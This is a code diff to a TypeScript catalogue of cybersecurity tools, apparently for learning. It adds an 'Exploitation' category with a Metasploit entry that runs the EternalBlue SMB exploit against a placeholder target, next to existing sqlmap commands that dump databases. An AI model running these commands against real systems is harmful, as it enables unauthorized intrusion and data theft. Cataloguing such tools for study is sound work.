@@ -4,7 +4,8 @@ export interface CyberTool {
     | "OSINT"
     | "Web Security"
     | "Password Attacks"
-    | "Wireless Security";
+    | "Wireless Security"
+    | "Exploitation";
   name: string;
   slug: string;
   level: "Beginner" | "Intermediate" | "Advanced";
@@ -142,6 +143,24 @@ export const cyberTools: CyberTool[] = [
       'sqlmap -u "http://target?id=1" --dbs',
       "sqlmap --tables",
       "sqlmap --dump",
+    ],
+  },
+
+  // ===============================
+  // EXPLOITATION
+  // ===============================
+  {
+    category: "Exploitation",
+    name: "Metasploit",
+    slug: "metasploit",
+    level: "Advanced",
+    use: "Exploit vulnerabilities and perform post-exploitation",
+    commands: [
+      "msfconsole",
+      "search exploit windows smb",
+      "use exploit/windows/smb/ms17_010_eternalblue",
+      "set RHOSTS target_ip",
+      "run",
     ],
   },
 
